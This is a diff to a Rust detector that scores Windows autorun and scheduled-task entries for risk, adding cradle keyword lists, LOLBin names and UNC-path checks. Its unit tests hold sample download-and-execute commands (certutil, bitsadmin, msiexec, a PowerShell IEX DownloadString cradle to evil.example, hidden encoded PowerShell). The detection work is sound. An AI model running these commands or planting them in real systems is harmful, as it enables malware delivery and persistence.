@@ -16,9 +16,33 @@ const DROP_ZONE_TOKENS: [&str; 4] = [
     "users/public",
 ];
 
+/// Second-tier zones: common malware landing spots that also host legitimate
+/// software (updaters in ProgramData, per-user apps in Roaming). Worth half
+/// a drop zone — a floor of Suspicious on their own, never Safe-by-default
+/// when combined with anything else, but not an automatic HighRisk.
+const SOFT_ZONE_TOKENS: [&str; 2] = ["programdata", "roaming"];
+
 const TRUSTED_TOKENS: [&str; 3] = ["program files", "system32", "syswow64"];
 
 const SNEAKY_POWERSHELL_TOKENS: [&str; 3] = ["-enc", "-windowstyle hidden", "-w hidden"];
+
+/// Script-cradle fragments. Unlike the LOLBIN gate, these fire on the
+/// COMMAND CONTENT regardless of which program runs: a signed helper whose
+/// autorun arguments contain `IEX (` or `DownloadString` is the classic
+/// signed-malware pattern Defender never inspects. Encoded/hidden
+/// PowerShell is deliberately NOT here — the sneaky-PowerShell heuristic
+/// already owns `-enc`/`-w hidden` and double-counting would inflate the
+/// same behavior twice.
+const CRADLE_TOKENS: [&str; 8] = [
+    "iex ",
+    "iex(",
+    "invoke-expression",
+    "downloadstring",
+    "downloadfile",
+    "frombase64string",
+    "javascript:",
+    "vbscript:",
+];
 
 /// Known Windows script-host / LOLBin executables (file names, lowercase).
 /// A *signed* copy of one of these with suspicious arguments is the classic
@@ -34,6 +58,10 @@ const LOLBIN_NAMES: &[&str] = &[
     "wscript.exe",
     "cscript.exe",
     "msbuild.exe",
+    "certutil.exe",
+    "bitsadmin.exe",
+    "msiexec.exe",
+    "installutil.exe",
 ];
 
 /// True when `program` (already normalized: lowercase, `/` separators) is a
@@ -195,13 +223,20 @@ fn score_with_expander(
     // arguments alike) before any heuristic sees it, so `%TEMP%\payload.exe`
     // matches the drop-zone tokens. Same helper services use for ImagePath;
     // identity off Windows (tests stay platform-independent there).
-    let expanded_command = expand(&entry.command);
+    // Detection Engine v2: scheduled-task `Arguments` (and second+ actions)
+    // are part of what the heuristics must judge — `powershell.exe -enc AAAA`
+    // used to score 0 because arguments lived outside `entry.command`.
+    let expanded_command = expand(&entry.scorer_command());
     let command_norm = normalize(&expanded_command);
     let program_norm = normalize(extract_program_path(&expanded_command));
 
     let drop_zone = DROP_ZONE_TOKENS
         .iter()
         .any(|t| path_has_token(&command_norm, t));
+    let soft_zone = !drop_zone
+        && SOFT_ZONE_TOKENS
+            .iter()
+            .any(|t| path_has_token(&command_norm, t));
     let trusted = TRUSTED_TOKENS
         .iter()
         .any(|t| path_has_token(&command_norm, t));
@@ -210,25 +245,38 @@ fn score_with_expander(
             .iter()
             .any(|t| command_norm.contains(t));
 
+    // Detection Engine v2: script cradles fire on content, not on the
+    // program name. `IEX`/`DownloadString`/encoded payloads inside an
+    // autorun argument are hostile regardless of how signed the host is.
+    let cradle = CRADLE_TOKENS.iter().any(|t| command_norm.contains(t));
+
     // F-LOLBIN-1: a LOLBin pulling a remote payload (URL arg or UNC path)
     // scores at least Suspicious on its own (+25 clears the threshold even
     // with every discount withheld). LOLBin-gated: `http://` in a data
     // file path elsewhere is not this signal.
     let remote_arg = is_lolbin_program(&program_norm) && has_remote_arg(&command_norm);
 
+    // Detection Engine v2: persistence that points at a network share from a
+    // NON-LOLBIN program (a Startup entry running `\\server\share\tool.exe`).
+    // The LOLBin case already scored above; this closes the plain-UNC gap at
+    // Suspicious weight. URLs stay lolbin-gated (benign homepages).
+    let network_share = !remote_arg && has_unc_path(&command_norm);
+
     // F-LOLBIN-1: a signed script host with suspicious command-line
     // arguments must not be laundered by location/signature discounts.
-    // When at least one command-line heuristic fires (drop zone, sneaky
-    // PowerShell, remote arg), the heuristics decide alone: NEITHER the
-    // trusted (-20) NOR the Valid (-40) discount applies. Penalties
-    // (Invalid +40, hash) are untouched, and with no heuristic firing
-    // scoring is unchanged.
-    let discounts_suppressed =
-        is_lolbin_program(&program_norm) && (drop_zone || sneaky_powershell || remote_arg);
+    // When a command-content heuristic fires (sneaky PowerShell, remote
+    // arg, cradle — or a drop zone behind a LOLBin), the heuristics decide
+    // alone: NEITHER the trusted (-20) NOR the Valid (-40) discount
+    // applies. Penalties (Invalid +40, hash) are untouched, and with no
+    // heuristic firing scoring is unchanged.
+    let discounts_suppressed = cradle
+        || sneaky_powershell
+        || remote_arg
+        || (is_lolbin_program(&program_norm) && drop_zone);
     let trusted_effective = trusted && !discounts_suppressed;
     if discounts_suppressed {
         evidence.push(Evidence::observed(
-            "script host with suspicious arguments: trust discounts withheld",
+            "suspicious command content: trust discounts withheld",
         ));
     }
 
@@ -236,6 +284,12 @@ fn score_with_expander(
         score += 30;
         evidence.push(Evidence::observed(
             "+30 command path sits in a temp/downloads/public drop zone",
+        ));
+    }
+    if soft_zone {
+        score += 15;
+        evidence.push(Evidence::observed(
+            "+15 command path sits in ProgramData/Roaming (common malware landing spot)",
         ));
     }
     if trusted_effective {
@@ -266,10 +320,24 @@ fn score_with_expander(
         ));
     }
 
+    if cradle {
+        score += 25;
+        evidence.push(Evidence::observed(
+            "+25 command arguments fetch or execute remote/encoded script content",
+        ));
+    }
+
     if remote_arg {
         score += 25;
         evidence.push(Evidence::observed(
             "+25 script host invoked with remote argument (URL/UNC)",
+        ));
+    }
+
+    if network_share {
+        score += 15;
+        evidence.push(Evidence::observed(
+            "+15 autorun points at a network share (Defender skips these)",
         ));
     }
 
@@ -352,6 +420,12 @@ fn has_remote_arg(command_norm: &str) -> bool {
     if command_norm.contains("://") {
         return true;
     }
+    has_unc_path(command_norm)
+}
+
+/// True when a normalized command line references a UNC network path
+/// (`//host/share…`). Pure over the already-normalized string.
+fn has_unc_path(command_norm: &str) -> bool {
     command_norm.split_whitespace().any(|tok| {
         let t = tok.trim_matches('"');
         t.starts_with("//") && t.len() > 2 && !t[2..].starts_with('/')
@@ -850,6 +924,199 @@ mod tests {
         );
         assert_eq!(scored.risk, RiskLevel::Safe);
         assert_eq!(scored.score, 0);
+    }
+
+    // ---- Detection Engine v2: gaps Defender leaves open -------------------
+
+    #[test]
+    fn certutil_urlcache_is_suspicious_even_when_signed() {
+        // certutil was not on the v1 LOLBIN list: `-urlcache http://…` scored
+        // 0 unless the binary path itself sat in a drop zone. Signed copy or
+        // not, a certificate tool fetching a payload must not be Safe.
+        let scored = score_with_signals(
+            &entry(
+                "Update Check",
+                r"C:\Windows\System32\certutil.exe -urlcache -f http://evil.example/payload.exe %APPDATA%\p.exe",
+            ),
+            SignatureStatus::ValidSigned,
+            None,
+        );
+        assert!(scored.risk == RiskLevel::Suspicious || scored.risk == RiskLevel::HighRisk);
+        assert!(scored
+            .evidence
+            .iter()
+            .any(|r| r.detail().contains("remote argument")));
+        // Trust discounts are withheld for a LOLBin with hostile arguments:
+        assert!(!scored
+            .evidence
+            .iter()
+            .any(|r| r.detail().contains("Valid Signature")));
+    }
+
+    #[test]
+    fn bitsadmin_transfer_is_suspicious() {
+        let scored = score_with_signals(
+            &entry(
+                "Download Job",
+                r"bitsadmin.exe /transfer job http://evil.example/x.exe C:\Users\Public\x.exe",
+            ),
+            SignatureStatus::Unknown,
+            None,
+        );
+        assert!(scored.risk != RiskLevel::Safe);
+    }
+
+    #[test]
+    fn msiexec_remote_package_is_suspicious() {
+        let scored = score_with_signals(
+            &entry(
+                "Remote Install",
+                r"msiexec.exe /i https://evil.example/x.msi /q",
+            ),
+            SignatureStatus::Unknown,
+            None,
+        );
+        assert!(scored.risk != RiskLevel::Safe);
+    }
+
+    #[test]
+    fn iex_cradle_fires_on_content_even_for_signed_helper() {
+        // The cradle heuristic is deliberately NOT lolbin-gated: a signed
+        // vendor helper whose autorun arguments contain an encoded IEX
+        // payload is the classic signed-malware pattern.
+        let scored = score_with_signals(
+            &entry(
+                "Helper",
+                r#""C:\Program Files\Vendor\helper.exe" -run "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/x')""#,
+            ),
+            SignatureStatus::ValidSigned,
+            None,
+        );
+        assert!(scored.risk != RiskLevel::Safe);
+        assert!(scored
+            .evidence
+            .iter()
+            .any(|r| r.detail().contains("fetch or execute remote/encoded")));
+        // Content signal suppresses the Valid discount.
+        assert!(!scored
+            .evidence
+            .iter()
+            .any(|r| r.detail().contains("Valid Signature")));
+    }
+
+    #[test]
+    fn plain_homepage_url_for_non_lolbin_stays_safe() {
+        // A vendor widget opening its homepage must not be flagged: URLs stay
+        // LOLBin-gated; only script hosts pay the remote-argument tax.
+        let scored = score_with_signals(
+            &entry(
+                "VendorWidget",
+                r#""C:\Program Files\Vendor\widget.exe" --open https://vendor.example/welcome"#,
+            ),
+            SignatureStatus::ValidSigned,
+            None,
+        );
+        assert_eq!(scored.risk, RiskLevel::Safe);
+    }
+
+    #[test]
+    fn unc_network_share_autorun_is_suspicious_for_any_program() {
+        // A Startup entry running a payload straight off a share is a classic
+        // Defender skip. Non-LOLBIN program: Suspicious floor, not silence.
+        let scored = score_with_signals(
+            &entry("Portable Tool", r"\\fileserver\share\tools\tool.exe /quiet"),
+            SignatureStatus::Unknown,
+            None,
+        );
+        assert!(scored.risk != RiskLevel::Safe);
+        assert!(scored
+            .evidence
+            .iter()
+            .any(|r| r.detail().contains("network share")));
+    }
+
+    #[test]
+    fn programdata_autorun_is_suspicious_floor() {
+        // ProgramData hosts both legit updaters and malware drops: half a
+        // drop zone — a Suspicious floor that a valid signature can still
+        // talk down.
+        let scored = score_with_signals(
+            &entry("Updater", r"C:\ProgramData\Acme\updater.exe"),
+            SignatureStatus::Unsigned,
+            None,
+        );
+        assert_eq!(scored.risk, RiskLevel::Suspicious);
+        assert!(scored
+            .evidence
+            .iter()
+            .any(|r| r.detail().contains("ProgramData/Roaming")));
+
+        // Signed + trusted-publisher style: the -40 can still talk it down.
+        let signed = score_with_signals(
+            &entry("Updater", r"C:\ProgramData\Acme\updater.exe"),
+            SignatureStatus::ValidSigned,
+            None,
+        );
+        assert_eq!(signed.risk, RiskLevel::Safe);
+    }
+
+    #[test]
+    fn roaming_autorun_is_suspicious_floor() {
+        let scored = score_with_signals(
+            &entry(
+                "Sync",
+                r"C:\Users\builder\AppData\Roaming\SyncApp\sync.exe /bg",
+            ),
+            SignatureStatus::Unknown,
+            None,
+        );
+        assert_eq!(scored.risk, RiskLevel::Suspicious);
+    }
+
+    #[test]
+    fn scheduled_task_arguments_are_scored() {
+        // The v1 gap: `Command: powershell.exe` + `Arguments: -enc AAAA…`
+        // scored 0 because arguments lived outside `entry.command`. The
+        // scorer now sees `scorer_command()` (command + attached arguments).
+        let mut task = entry(
+            "SystemCheck",
+            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+        );
+        task = task.with_arguments(Some("-nop -w hidden -enc AAAA1000chars".to_string()));
+        let scored = score_with_signals(&task, SignatureStatus::Unknown, None);
+        assert!(scored.risk != RiskLevel::Safe);
+        assert!(scored
+            .evidence
+            .iter()
+            .any(|r| r.detail().contains("encoded command or hidden window")));
+
+        // And the stable id is untouched by argument material:
+        let bare = entry(
+            "SystemCheck",
+            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+        );
+        assert_eq!(task.id, bare.id);
+    }
+
+    #[test]
+    fn scheduled_task_second_action_is_scored() {
+        // Multi-action tasks: action 2's command used to be invisible.
+        let mut task = entry("Maintenance", r"C:\Windows\System32\cleanmgr.exe");
+        task = task.with_arguments(Some(
+            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc AAAA ; ".to_string(),
+        ));
+        let scored = score_with_signals(&task, SignatureStatus::Unknown, None);
+        assert!(scored.risk != RiskLevel::Safe);
+    }
+
+    #[test]
+    fn normal_signed_task_arguments_stay_safe() {
+        // Guard against over-firing: a perfectly normal task with ordinary
+        // arguments must remain Safe.
+        let mut task = entry("DiskCleanup", r"C:\Windows\System32\cleanmgr.exe");
+        task = task.with_arguments(Some("/autoclean /d C:".to_string()));
+        let scored = score_with_signals(&task, SignatureStatus::Unknown, None);
+        assert_eq!(scored.risk, RiskLevel::Safe);
     }
 
     #[test]
